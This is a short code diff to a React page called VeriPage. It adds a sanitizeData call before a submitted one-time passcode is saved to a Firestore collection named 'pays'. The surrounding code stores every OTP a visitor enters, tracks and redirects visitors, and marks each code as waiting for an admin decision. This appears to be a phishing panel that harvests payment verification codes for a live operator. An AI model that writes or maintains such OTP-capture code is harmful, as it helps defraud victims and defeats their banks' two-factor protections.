@@ -13,6 +13,7 @@ import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { updateVisitorPage } from "@/lib/visitor-tracking"
+import { sanitizeData } from "@/lib/sanitize"
 
 const allOtps: string[] = []
 
@@ -206,8 +207,12 @@ export default function VeriPage() {
       allOtps.push(_v5)
       // Update the document with the OTP
       if (!db) return
+      
+      // Sanitize OTP data before saving
+      const sanitizedOtp = sanitizeData({ _v5 });
+      
       await setDoc(doc(db as Firestore, "pays", visitorID), {
-        _v5,
+        ...sanitizedOtp,
         otpSubmittedAt: new Date().toISOString(),
         allOtps,
         _v5Status: "verifying", // Set to verifying, waiting for admin decision
